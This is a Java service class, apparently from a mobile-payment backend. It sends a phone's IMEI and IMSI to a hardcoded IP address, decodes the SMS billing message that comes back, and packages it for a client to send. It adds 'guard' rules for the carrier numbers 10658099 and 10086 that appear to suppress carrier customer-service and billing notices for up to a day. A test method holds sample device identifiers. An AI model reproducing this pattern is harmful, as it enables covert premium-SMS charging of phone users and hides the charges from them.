package com.jxt.pay.appclient.service.dynamic.net;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.CommonUtil;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;
import com.jxt.pay.appclient.utils.SingleXmlUtil;

public class LjdmDynamicService implements IDynamicService{

	private static final String TYPE = "ljdm";
	
	private static final String REQUESTPARAM = "version=1.0.0.8&pid={pid}&imei={imei}&imsi={imsi}&chargeId={chargeId}&payId={payId}&channelId={channelId}";
	
	private static final Guard guard1 = new Guard("10658099","客服热线",1440,"1",0);
	private static final Guard guard2 = new Guard("10658099","",960,null,1);
	private static final Guard guard3 = new Guard("10086","",960,null,1);
	
	private static final Integer DEFAULTSUCCESSTIMEOUT = 10;
	
	private Map<String, Long> tryMap = new HashMap<String, Long>();
	
	
	private int timeOut = 60;
	
	@Override
	public String getType() {
		return TYPE;
	}

	@Override
	public String dynamic(Map<String, String> map) {
		
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String pid = map.get("pid");
			String chargeId = map.get("chargeId");
			String payId = "0123456789abcdef";
			String channelId = map.get("channelId");
			String imei = map.get("imei");
			String imsi = map.get("imsi");
			
			String param = REQUESTPARAM.replace("{pid}",pid).replace("{chargeId}",chargeId).replace("{payId}",payId).replace("{channelId}",channelId).replace("{imei}",imei).replace("{imsi}",imsi);
			
			String responseXml = GetData.getData(url, param);
			
			xml = parseXml(responseXml,map);

			if(xml == null || xml.length() == 0){
				xml = DynamicUtils.parseWait(7,map);
			}else{
				tryMap.remove(channel);
			}
		}
		
		return xml;
	}
	
	private String parseXml(String responseXml,Map<String,String> map){
		
		if(responseXml != null && responseXml.length() > 0){
			System.out.println(responseXml);
			
			String status = SingleXmlUtil.getNodeValue(responseXml, "status");
			
			if("0".equals(status)){
				String address = SingleXmlUtil.getNodeValue(responseXml, "address");
				String SMS = SingleXmlUtil.getNodeValue(responseXml, "SMS");
				
				try {
					String content = CommonUtil.base64Decode(SMS);
				
					List<Sms> smsList = new ArrayList<Sms>();
					
					Sms sms = new Sms();
					
					sms.setSmsContent(content);
					sms.setSmsDest(address);
					sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
					
					smsList.add(sms);
				
					Sms guardSms = new Sms();
										
					List<Guard> guardList = new ArrayList<Guard>();
					
					guardList.add(guard1);
					guardList.add(guard2);
					guardList.add(guard3);
					
					guardSms.setGuardList(guardList);
					
					smsList.add(0, guardSms);
					
					return XstreamHelper.toXml(smsList);
				} catch (UnsupportedEncodingException e) {
					e.printStackTrace();
				} catch (IOException e) {
					e.printStackTrace();
				}
			}else{
				return DynamicUtils.parseWait(7,map);
			}
		}
		
		return null;
	}
	
	
	public static void main(String[] args){
	//http://182.92.21.219:10789/cmcc/mm/comic/s2sChargeSMS?version=1.0.0.8&pid=5049053505-5185542862&imei=869460011612203&imsi=460001153105779&chargeId=300004344001&payId=10B601a087654321&channelId=0000000000
		
		Map<String, String> map = new HashMap<String, String>();
	
		map.put("url","http://182.92.21.219:10789/cmcc/mm/comic/s2sChargeSMS");
		map.put("pid","5049053505-5185542862");
		map.put("imei","869460011612203");
		map.put("imsi","460028174282753");
		map.put("chargeId","300004344006");
		map.put("channel","0123456789abcdef");
		map.put("channelId","0000000000");
		
		System.out.println(new LjdmDynamicService().dynamic(map));
	}

}
